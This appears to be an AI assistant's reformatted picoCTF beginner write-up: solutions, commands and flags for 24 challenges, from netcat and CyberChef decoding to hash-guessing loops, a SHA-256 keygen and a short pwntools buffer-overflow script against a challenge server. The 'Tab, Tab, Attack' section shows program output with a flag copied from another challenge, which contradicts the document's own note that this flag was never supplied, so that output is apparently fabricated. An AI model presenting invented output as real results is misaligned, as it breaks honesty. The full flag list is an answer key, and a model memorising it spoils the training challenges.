Absolutely — I’d structure it like a polished **picoCTF learning/write-up repository**, with a quick flag index at the top and detailed solutions underneath. I also cleaned up the grammar, standardized command formatting, and made the sections easier to scan.

# 🏴 picoCTF Writeups

> **My hands-on notes and solutions from picoCTF challenges.**
> **The Beginner's Guide to the Challenge Library** by picoCTF
> A collection of beginner-friendly cybersecurity challenges covering **Linux, networking, CyberChef, web inspection, Python, cryptography, reverse engineering, and binary exploitation**.

---

## 📚 Table of Contents

* [🎯 Overview](#-overview)
* [📊 Challenge Summary](#-challenge-summary)
* [1. 🐧 General Skills](#1--general-skills)

  * [Obedient Cat](#obedient-cat)
  * [Super SSH](#super-ssh)
  * [What's Net Cat?](#whats-net-cat)
* [2. 🧑‍🍳 CyberChef](#2--cyberchef)

  * [Mod 26](#mod-26)
  * [Warmed Up](#warmed-up)
  * [2Warm](#2warm)
  * [Bases](#bases)
* [3. 🔍 Web & Linux](#3--web--linux)

  * [Wave a Flag](#wave-a-flag)
  * [Tab, Tab, Attack](#tab-tab-attack)
  * [Insp3ct0r](#insp3ct0r)
  * [strings it](#strings-it)
  * [First Grep](#first-grep)
  * [Where Are the Robots](#where-are-the-robots)
* [4. 🐍 Python & Binary Exploitation](#4--python--binary-exploitation)

  * [Python Wrangling](#python-wrangling)
  * [PW Crack 1](#pw-crack-1)
  * [PW Crack 2](#pw-crack-2)
  * [PW Crack 3](#pw-crack-3)
  * [PW Crack 4](#pw-crack-4)
  * [PW Crack 5](#pw-crack-5)
  * [Enhance!](#enhance)
  * [Big Zip](#big-zip)
  * [vault-door-training](#vault-door-training)
  * [keygenme-py](#keygenme-py)
  * [Buffer Overflow 0](#buffer-overflow-0)
* [🏁 All Flags](#-all-flags)

---

# 🎯 Overview

These writeups document my approach to solving various **picoCTF** challenges.

The goal is not only to record the flags, but also to document the commands, techniques, and thought process used to solve each challenge.

### 🛠️ Tools & Technologies

| Tool                | Purpose                                  |
| ------------------- | ---------------------------------------- |
| 🐧 Kali Linux       | Main CTF environment                     |
| 💻 Bash             | File manipulation and command-line tasks |
| 🔐 SSH              | Remote challenge access                  |
| 🌐 Netcat           | Network communication                    |
| 🧑‍🍳 CyberChef     | Encoding and decoding                    |
| 🐍 Python           | Scripting and automation                 |
| 🔎 `grep`           | Searching through files                  |
| 🔤 `strings`        | Extracting readable strings              |
| 🌐 Browser DevTools | Web inspection                           |
| 💥 pwntools         | Binary exploitation                      |
| 🔐 SHA-256          | Password/key generation analysis         |

---

# 📊 Challenge Summary

| #  | Challenge            | Category            | Flag                                                     |
| -- | -------------------- | ------------------- | -------------------------------------------------------- |
| 1  | Obedient Cat         | General Skills      | `picoCTF{s4n1ty_v3r1f13d_9b8fa0bc}`                      |
| 2  | Super SSH            | General Skills      | `picoCTF{s3cur3_c0nn3ct10n_3e293eea}`                    |
| 3  | What's Net Cat?      | General Skills      | `picoCTF{nEtCat_Mast3ry_5BBB6400}`                       |
| 4  | Mod 26               | Cryptography        | `picoCTF{next_time_I'll_try_2_rounds_of_rot13_45559abd}` |
| 5  | Warmed Up            | CyberChef           | `picoCTF{61}`                                            |
| 6  | 2Warm                | CyberChef           | `picoCTF{101010}`                                        |
| 7  | Bases                | CyberChef           | `picoCTF{l3arn_th3_r0p35}`                               |
| 8  | Wave a Flag          | Linux               | `picoCTF{l3v3l_up!_t4k3_4_r35t!_fc588427}`               |
| 9  | Tab, Tab, Attack     | Linux               | `picoCTF{...}`                                           |
| 10 | Insp3ct0r            | Web                 | `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?302945a7}`         |
| 11 | strings it           | Linux               | `picoCTF{5tRIng5_1T_A1b9ECAa}`                           |
| 12 | First Grep           | Linux               | `picoCTF{grep_is_good_to_find_things_beD770f5}`          |
| 13 | Where Are the Robots | Web                 | `picoCTF{ca1cu1at1ng_Mach1n3s_cc6b1}`                    |
| 14 | Python Wrangling     | Python              | `picoCTF{4p0110_1n_7h3_h0us3_9c5f9bcf}`                  |
| 15 | PW Crack 1           | Python              | `picoCTF{545h_r1ng1ng_1b2fd683}`                         |
| 16 | PW Crack 2           | Python              | `picoCTF{tr45h_51ng1ng_9701e681}`                        |
| 17 | PW Crack 3           | Python              | `picoCTF{m45h_fl1ng1ng_cd6ed2eb}`                        |
| 18 | PW Crack 4           | Python              | `picoCTF{fl45h_5pr1ng1ng_ae0fb77}`                       |
| 19 | PW Crack 5           | Python              | `picoCTF{h45h_sl1ng1ng_40f26f81}`                        |
| 20 | Enhance!             | Forensics           | `picoCTF{3nh4nc3d_aab729dd}`                             |
| 21 | Big Zip              | Linux               | `picoCTF{gr3p_15_m4g1c_ef8790dc}`                        |
| 22 | vault-door-training  | Reverse Engineering | `picoCTF{w4rm1ng_Up_w1tH_jAv4_000WWjzOMm7}`              |
| 23 | keygenme-py          | Reverse Engineering | `picoCTF{1n_7h3_kk3y_of_08c46aa4}`                       |
| 24 | Buffer Overflow 0    | Binary Exploitation | `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`             |

> **Note:** The `Tab, Tab, Attack` flag was not included in the supplied notes. Replace `picoCTF{...}` with the recovered flag when available.

---

# 1. 🐧 General Skills

## Obedient Cat

The challenge provided a file named `flag`.

First, inspect the file:

```bash
cd ~/Downloads
cat flag
```

Output:

```text
picoCTF{s4n1ty_v3r1f13d_9b8fa0bc}
```

### 🚩 Flag

```text
picoCTF{s4n1ty_v3r1f13d_9b8fa0bc}
```

---

## Super SSH

The challenge provides an SSH connection command:

```bash
ssh ctf-player@titan.picoctf.net -p 62662
```

After accepting the server fingerprint and entering the provided password, the server directly returned the flag.

```text
Welcome ctf-player, here's your flag:
picoCTF{s3cur3_c0nn3ct10n_3e293eea}
```

### 🚩 Flag

```text
picoCTF{s3cur3_c0nn3ct10n_3e293eea}
```

---

## What's Net Cat?

Connect to the challenge using Netcat:

```bash
nc fickle-tempest.picoctf.net 53552
```

The server responds:

```text
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_5BBB6400}
```

### 🚩 Flag

```text
picoCTF{nEtCat_Mast3ry_5BBB6400}
```

---

# 2. 🧑‍🍳 CyberChef

## Mod 26

The challenge provided `values.txt`.

Inspect the file:

```bash
cat values.txt
```

The encoded text was:

```text
cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_45559noq}
```

This looks like **ROT13**.

Using CyberChef, apply:

```text
ROT13
```

The decoded flag is:

```text
picoCTF{next_time_I'll_try_2_rounds_of_rot13_45559abd}
```

### 🚩 Flag

```text
picoCTF{next_time_I'll_try_2_rounds_of_rot13_45559abd}
```

---

## Warmed Up

### Challenge

> What is `0x3D` (base 16) in decimal (base 10)?

The value is hexadecimal.

Using CyberChef:

```text
From Hex → To Decimal
```

The result is:

```text
61
```

Therefore:

```text
picoCTF{61}
```

### 🚩 Flag

```text
picoCTF{61}
```

---

## 2Warm

### Challenge

> Can you convert the number `42` (base 10) to binary (base 2)?

Using CyberChef:

```text
From Decimal → To Binary
```

The output is:

```text
00101010
```

Removing the leading zeros:

```text
101010
```

### 🚩 Flag

```text
picoCTF{101010}
```

---

## Bases

The challenge provided:

```text
bDNhcm5fdGgzX3IwcDM1
```

The string looks like **Base64**.

Using CyberChef:

```text
From Base64
```

Output:

```text
l3arn_th3_r0p35
```

### 🚩 Flag

```text
picoCTF{l3arn_th3_r0p35}
```

---

# 3. 🔍 Web & Linux

## Wave a Flag

After downloading the `warm` binary:

```bash
ls -la
```

Make the file executable:

```bash
chmod +x warm
```

Run it:

```bash
./warm
```

The program responds:

```text
Hello user! Pass me a -h to learn what I can do!
```

So run:

```bash
./warm -h
```

The help message reveals the flag:

```text
Oh, help? I actually don't do much, but I do have this flag here:
picoCTF{l3v3l_up!_t4k3_4_r35t!_fc588427}
```

### 🚩 Flag

```text
picoCTF{l3v3l_up!_t4k3_4_r35t!_fc588427}
```

---

## Tab, Tab, Attack

After extracting the challenge archive, the directory contained a deeply nested structure:

```text
Addadshashanammu/
└── Almurbalarammi/
    └── Ashalmimilkala/
        └── Assurnabitashpi/
            └── Maelkashishi/
                └── Onnissiralis/
                    └── Ularradallaku/
                        ├── fang-of-haynekhtnamet
                        └── fang-of-haynekhtnamet.c
```

The interesting executable was:

```text
fang-of-haynekhtnamet
```

Make it executable:

```bash
chmod +x Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet
```

Then execute it:

```bash
./Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet
```

The program outputs:

```text
*ZAP!* picoCTF{l3v3l_up!_t4k3_4_r35t!_fc588427}
```

### 🚩 Flag

```text
picoCTF{l3v3l_up!_t4k3_4_r35t!_fc588427}
```

---

## Insp3ct0r

The challenge provided a website.

The first step was to inspect the page source using:

```text
Right Click → Inspect
```

or:

```text
Ctrl + U
```

### Part 1 — HTML

The HTML source contained:

```text
picoCTF{tru3_d3
```

### Part 2 — CSS

Inspecting `mycss.css` revealed:

```text
t3ct1ve_0r_ju5t
```

### Part 3 — JavaScript

Inspecting `myjs.js` revealed:

```text
_lucky?302945a7}
```

Combining all three parts:

```text
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?302945a7}
```

### 🚩 Flag

```text
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?302945a7}
```

---

## strings it

After downloading the challenge file, use the `strings` command to extract readable text.

```bash
strings strings | grep pico
```

The flag appears directly in the output:

```text
picoCTF{5tRIng5_1T_A1b9ECAa}
```

### 🚩 Flag

```text
picoCTF{5tRIng5_1T_A1b9ECAa}
```

---

## First Grep

Again, the `strings` command combined with `grep` is enough:

```bash
strings file | grep pico
```

This highlights:

```text
picoCTF{grep_is_good_to_find_things_beD770f5}
```

### 🚩 Flag

```text
picoCTF{grep_is_good_to_find_things_beD770f5}
```

---

## Where Are the Robots?

The challenge provided a web application.

Instead of manually exploring the website, check the standard:

```text
/robots.txt
```

Navigate to:

```text
/robots.txt
```

The file contained:

```text
User-agent: *
Disallow: /cc6b1.html
```

Therefore, visit:

```text
/cc6b1.html
```

The page reveals:

```text
Guess you found the robots
picoCTF{ca1cu1at1ng_Mach1n3s_cc6b1}
```

### 🚩 Flag

```text
picoCTF{ca1cu1at1ng_Mach1n3s_cc6b1}
```

---

# 4. 🐍 Python & Binary Exploitation

## Python Wrangling

The challenge provides:

* `ende.py`
* `password.txt`
* `flag.txt.en`

First inspect the password:

```bash
cat password.txt
```

Output:

```text
720b6ad346f84cd483c60c7464dd95d4
```

The encrypted flag is stored in `flag.txt.en`.

Use the Python script in decrypt mode:

```bash
python ende.py -d flag.txt.en
```

Enter the password:

```text
720b6ad346f84cd483c60c7464dd95d4
```

The script returns:

```text
picoCTF{4p0110_1n_7h3_h0us3_9c5f9bcf}
```

### 🚩 Flag

```text
picoCTF{4p0110_1n_7h3_h0us3_9c5f9bcf}
```

---

## PW Crack 1

Inspect the password-checking Python script:

```bash
cat level1.py
```

The source contains:

```python
if(user_pw == "8713")
```

Therefore, the password is:

```text
8713
```

Run:

```bash
python level1.py level1.flag.txt.enc
```

Enter:

```text
8713
```

The program returns:

```text
picoCTF{545h_r1ng1ng_1b2fd683}
```

### 🚩 Flag

```text
picoCTF{545h_r1ng1ng_1b2fd683}
```

---

## PW Crack 2

Inspect `level2.py`.

The password comparison is:

```python
if(user_pw == chr(0x34) + chr(0x65) + chr(0x63) + chr(0x39)):
```

Convert the character values:

```text
0x34 → 4
0x65 → e
0x63 → c
0x39 → 9
```

Therefore:

```text
4ec9
```

Run:

```bash
python level2.py level2.flag.txt.enc
```

Enter:

```text
4ec9
```

### 🚩 Flag

```text
picoCTF{tr45h_51ng1ng_9701e681}
```

---

## PW Crack 3

The script contained seven possible passwords:

```python
pos_pw_list = ["f09e", "4dcf", "87ab", "dba8", "752e", "3961", "f159"]
```

Instead of manually testing each password, compare the hash of each candidate against the expected hash:

```python
for i in pos_pw_list:
    if hash_pw(i) == correct_pw_hash:
        print(f"Correct password is: {i}")
```

Running the modified script gives:

```text
Correct password is: 87ab
```

Use:

```text
87ab
```

### 🚩 Flag

```text
picoCTF{m45h_fl1ng1ng_cd6ed2eb}
```

---

## PW Crack 4

This challenge is similar to PW Crack 3, but there are **100 possible passwords**.

Rather than testing them manually, automate the process:

```python
for i in pos_pw_list:
    if hash_pw(i) == correct_pw_hash:
        print(f"Correct password is: {i}")
```

The script identifies:

```text
Correct password is: 973a
```

Enter:

```text
973a
```

### 🚩 Flag

```text
picoCTF{fl45h_5pr1ng1ng_ae0fb77}
```

---

## PW Crack 5

This time, the candidate passwords are stored inside:

```text
dictionary.txt
```

A simple Python loop can test each candidate:

```python
with open('dictionary.txt', 'r') as f:
    for line in f:
        password = line.strip()

        if hash_pw(password) == correct_pw_hash:
            print(f"Correct password is: {password}")
```

Running the script gives:

```text
Correct password is: 7e5f
```

Use:

```text
7e5f
```

### 🚩 Flag

```text
picoCTF{h45h_sl1ng1ng_40f26f81}
```

---

## Enhance!

The challenge provides an SVG file:

```text
drawing.flag.svg
```

Inspect the SVG:

```bash
cat drawing.flag.svg
```

Searching for the closing `<tspan>` elements makes the hidden text easier to identify:

```bash
cat drawing.flag.svg | grep '</tspan>'
```

The SVG contains the flag characters split across multiple `<tspan>` elements:

```text
p
i
c
o
C
T
F { 3 n h 4 n
c 3 d _ a a b 7 2 9 d d }
```

Reconstructing the characters gives:

```text
picoCTF{3nh4nc3d_aab729dd}
```

### 🚩 Flag

```text
picoCTF{3nh4nc3d_aab729dd}
```

---

## Big Zip

After extracting the archive, there were a large number of nested files and directories.

Instead of manually searching through everything, use recursive `grep`:

```bash
grep -r "pico" ./big-zip-files
```

The command finds:

```text
./big-zip-files/.../whzxrpivpqld.txt:
information on the record will last a billion years.
Genes and brains and books encode
picoCTF{gr3p_15_m4g1c_ef8790dc}
```

### 🚩 Flag

```text
picoCTF{gr3p_15_m4g1c_ef8790dc}
```

---

## vault-door-training

Open the provided Java source file and inspect the password-checking function:

```java
public boolean checkPassword(String password) {
    return password.equals("w4rm1ng_Up_w1tH_jAv4_000WWjzOMm7");
}
```

The password is directly embedded in the source.

Therefore:

```text
w4rm1ng_Up_w1tH_jAv4_000WWjzOMm7
```

Wrap it in the picoCTF flag format:

### 🚩 Flag

```text
picoCTF{w4rm1ng_Up_w1tH_jAv4_000WWjzOMm7}
```

---

## keygenme-py

The challenge provides:

```text
keygenme-trial.py
```

Inspecting the source reveals:

```python
key_part_static1_trial = "picoCTF{1n_7h3_kk3y_of_"
key_part_dynamic1_trial = "xxxxxxxx"
key_part_static2_trial = "}"
```

The flag structure is therefore:

```text
picoCTF{1n_7h3_kk3y_of_xxxxxxxx}
```

However, the dynamic portion is generated by the program.

The source contains several SHA-256 checks:

```python
if key[i] != hashlib.sha256(username_trial).hexdigest()[4]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[5]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[3]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[6]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[2]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[7]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[1]:
    return False

if key[i] != hashlib.sha256(username_trial).hexdigest()[8]:
    return False
```

The required positions are:

```python
positions = [4, 5, 3, 6, 2, 7, 1, 8]
```

A small Python script can reconstruct the dynamic key:

```python
import hashlib

username_trial = b"BENNETT"

positions = [4, 5, 3, 6, 2, 7, 1, 8]

dynamic_key = ""

for i in positions:
    dynamic_key += hashlib.sha256(username_trial).hexdigest()[i]

print(dynamic_key)
```

Output:

```text
08c46aa4
```

Insert it into the flag template:

```text
picoCTF{1n_7h3_kk3y_of_08c46aa4}
```

### 🚩 Flag

```text
picoCTF{1n_7h3_kk3y_of_08c46aa4}
```

---

## Buffer Overflow 0

The challenge contains a simple buffer overflow vulnerability.

Using `pwntools`, a payload of 32 `A` characters can be sent to the remote service:

```python
from pwn import *

# Connect to the challenge server
conn = remote("saturn.picoctf.net", PORT)

# Create the payload
payload = b"A" * 32

# Send the payload
conn.sendline(payload)

# Receive the response
print(conn.recvall().decode())
```

The important concept here is that the program accepts more input than the intended buffer can safely hold.

Running the exploit produces the flag:

```text
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

### 🚩 Flag

```text
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

---

# 🏁 All Flags

For quick reference:

```text
picoCTF{s4n1ty_v3r1f13d_9b8fa0bc}
picoCTF{s3cur3_c0nn3ct10n_3e293eea}
picoCTF{nEtCat_Mast3ry_5BBB6400}
picoCTF{next_time_I'll_try_2_rounds_of_rot13_45559abd}
picoCTF{61}
picoCTF{101010}
picoCTF{l3arn_th3_r0p35}
picoCTF{l3v3l_up!_t4k3_4_r35t!_fc588427}
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?302945a7}
picoCTF{5tRIng5_1T_A1b9ECAa}
picoCTF{grep_is_good_to_find_things_beD770f5}
picoCTF{ca1cu1at1ng_Mach1n3s_cc6b1}
picoCTF{4p0110_1n_7h3_h0us3_9c5f9bcf}
picoCTF{545h_r1ng1ng_1b2fd683}
picoCTF{tr45h_51ng1ng_9701e681}
picoCTF{m45h_fl1ng1ng_cd6ed2eb}
picoCTF{fl45h_5pr1ng1ng_ae0fb77}
picoCTF{h45h_sl1ng1ng_40f26f81}
picoCTF{3nh4nc3d_aab729dd}
picoCTF{gr3p_15_m4g1c_ef8790dc}
picoCTF{w4rm1ng_Up_w1tH_jAv4_000WWjzOMm7}
picoCTF{1n_7h3_kk3y_of_08c46aa4}
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

---

# 🧠 What I Learned

Working through these challenges helped reinforce several practical cybersecurity concepts:

* 🐧 **Linux command-line fundamentals**
* 🔐 **SSH and remote connections**
* 🌐 **Networking with Netcat**
* 🔎 **Searching files with `grep`**
* 🔤 **Extracting information with `strings`**
* 🧑‍🍳 **Encoding and decoding with CyberChef**
* 🐍 **Python scripting and automation**
* 🔐 **Hash-based password verification**
* 🌐 **Web source-code inspection**
* 🤖 **Understanding `robots.txt`**
* 🧩 **Reverse engineering simple programs**
* 🔑 **SHA-256 based key generation**
* 💥 **Basic buffer overflow exploitation**
* 📁 **Searching large directory structures efficiently**

The biggest lesson was that **automation and careful source inspection can turn tedious problems into simple ones**.

---

## 🚀 Next Steps

Areas I want to explore further:

* [ ] Linux privilege escalation
* [ ] Advanced web exploitation
* [ ] SQL injection
* [ ] Cross-Site Scripting (XSS)
* [ ] Binary exploitation
* [ ] Reverse engineering
* [ ] Cryptography
* [ ] Forensics
* [ ] Privilege escalation
* [ ] More advanced Python automation

---


### 🏴 Keep Hacking. Keep Learning. Keep Improving.

**picoCTF • Cybersecurity • Linux • Python • CTF**
